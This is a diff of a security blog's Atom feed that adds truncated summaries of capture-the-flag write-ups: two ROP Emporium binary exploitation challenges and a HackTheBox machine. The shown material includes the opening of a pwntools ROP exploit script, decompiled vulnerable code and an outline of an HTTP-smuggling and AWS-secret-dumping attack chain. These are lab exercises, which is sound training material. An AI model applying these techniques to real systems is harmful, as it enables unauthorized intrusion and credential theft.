@@ -4,7 +4,7 @@
   <id>/</id>
   <title>tinyb0y</title>
   <subtitle>A minimal, portfolio, sidebar, bootstrap Jekyll theme with responsive web design and focuses on text presentation.</subtitle>
-  <updated>2021-10-05T15:41:33+05:30</updated>
+  <updated>2021-10-05T16:32:45+05:30</updated>
   <author>
     <name>tinyb0y</name>
     <uri>/</uri>
@@ -113,6 +113,181 @@ Background Story:
 You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).
 
 Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may le...
+    </summary>
+  
+
+  </entry>
+
+  
+  <entry>
+    <title>ROP Emporium Callme Pwn</title>
+    <link href="/posts/Callme/" rel="alternate" type="text/html" title="ROP Emporium Callme Pwn" />
+    <published>2021-09-14T05:30:00+05:30</published>
+  
+    <updated>2021-09-14T05:30:00+05:30</updated>
+  
+    <id>/posts/Callme/</id>
+    <content src="/posts/Callme/" />
+    <author>
+      <name>tinyb0y</name>
+    </author>
+
+  
+    
+    <category term="pwn" />
+    
+    <category term="rop" />
+    
+  
+
+  
+    <summary>
+      
+
+
+
+
+
+      gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+gdb-peda$ 
+
+from pwn import *
+
+LOCAL = False
+
+if LOCAL:
+  p = process("./callme")
+else:
+  p = remote("127.0.0.1", 1337)
+
+elf = ELF('./callme')
+
+OFFSET = 40
+pop_rdi = p64(0x00000000004009a3)
+ret = p64(0x00000000004006be)
+
+arg1 = p64(0xdeadbeefdeadbeef)
+arg2 = p64(0xcafebabeca...
+    </summary>
+  
+
+  </entry>
+
+  
+  <entry>
+    <title>ROP Emporium Split Pwn</title>
+    <link href="/posts/Split/" rel="alternate" type="text/html" title="ROP Emporium Split Pwn" />
+    <published>2021-09-01T05:30:00+05:30</published>
+  
+    <updated>2021-09-01T05:30:00+05:30</updated>
+  
+    <id>/posts/Split/</id>
+    <content src="/posts/Split/" />
+    <author>
+      <name>tinyb0y</name>
+    </author>
+
+  
+    
+    <category term="pwn" />
+    
+    <category term="rop" />
+    
+  
+
+  
+    <summary>
+      
+
+
+
+
+
+      gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+gdb-peda$ 
+
+
+Reversing in ghidra
+
+
+undefined8 main(void)
+
+{
+  setvbuf(stdout,(char *)0x0,2,0);
+  puts("split by ROP Emporium");
+  puts("x86_64\n");
+  pwnme();
+  puts("\nExiting");
+  return 0;
+}
+
+void pwnme(void)
+
+{
+  undefined local_28 [32];
+  
+  memset(local_28,0,0x20);
+  p...
+    </summary>
+  
+
+  </entry>
+
+  
+  <entry>
+    <title>Sink HTB</title>
+    <link href="/posts/Sink/" rel="alternate" type="text/html" title="Sink HTB" />
+    <published>2021-08-11T05:30:00+05:30</published>
+  
+    <updated>2021-08-11T05:30:00+05:30</updated>
+  
+    <id>/posts/Sink/</id>
+    <content src="/posts/Sink/" />
+    <author>
+      <name>tinyb0y</name>
+    </author>
+
+  
+    
+    <category term="hackthebox" />
+    
+    <category term="linux" />
+    
+  
+
+  
+    <summary>
+      
+
+
+
+
+
+      
+  Nmap
+  Recon
+    
+      HTTP Smuggling Attack
+      Enumerate the Git Repositories
+      Dump AWS (Amazon Web Services) Secrets, Keys
+      Decryption using AWS KMS
+    
+  
+
+
+Short Brief
+
+HTTP Smuggling attack on haproxy, gunicorn server combination. Get admin session key using smuggling attack and leak his notes containing usernames and passwords. Login with a user on Gitea and one of the r...
     </summary>
   
 
